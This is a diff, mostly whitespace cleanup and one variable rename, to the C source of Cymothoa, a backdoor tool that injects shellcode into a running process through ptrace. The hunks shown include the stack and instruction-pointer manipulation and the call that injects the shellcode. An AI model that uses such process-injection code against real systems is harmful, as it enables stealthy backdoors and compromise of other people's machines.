@@ -1,6 +1,6 @@
 /*
  * CYMOTHOA.C
- * 
+ *
  * Copyright (C) 2009
  * codwizard <codwizard@gmail.com>, crossbower <crossbower@gmail.com>
  *
@@ -65,8 +65,8 @@ int search_lib_region(pid_t pid, char *lib_name)
     // read output
     maps = popen(cmd, "r");
     fgets(output, 1024-1, maps);
-    pclose(maps);    
-    
+    pclose(maps);
+
     // get region
     sscanf(output, "%x", &region);
 
@@ -128,7 +128,7 @@ int ptrace_infect()
         printf(" esp is at: 0x%.8x\t", reg.STACK_POINTER);
         printf(" eip is at: 0x%.8x\n", reg.INST_POINTER);
         printf(" ------------------------------------------------------------\n\n");
-        
+
         reg.STACK_POINTER -= BLOCK_SIZE; // decrement STACK_POINTER
 
         printf("[+] new esp: 0x%.8lx\n", reg.STACK_POINTER);
@@ -141,10 +141,10 @@ int ptrace_infect()
         printf("[+] injecting code into 0x%.8x\n", beg);
 
         reg.INST_POINTER = beg + 2;
-        printf("[+] copy general purpose registers\n"); 
+        printf("[+] copy general purpose registers\n");
         ptrace(PTRACE_SETREGS,pid,&reg,&reg);
 
-        // inject the shellcode        
+        // inject the shellcode
         ptrace_inject(pid, ptr, sh_buffer, payload_len+1);
 
         printf("[+] detaching from %d\n\n", pid);
@@ -181,7 +181,7 @@ int parse_arguments(int argc,char **argv)
             case 'p': // process pid
                 args.pid = atoi(optarg);
                 break;
-            
+
             case 's': // payload index (shellcode)
                 args.payload_index = atoi(optarg);
                 break;
@@ -211,11 +211,11 @@ int parse_arguments(int argc,char **argv)
                 break;
 
             case 'c': // script code
-                args.perl_code = optarg;
+                args.script_code = optarg;
                 break;
 
             case 'C': // script file
-                args.perl_file = optarg;
+                args.script_file = optarg;
                 break;
 
             case 'h': // show help/usage
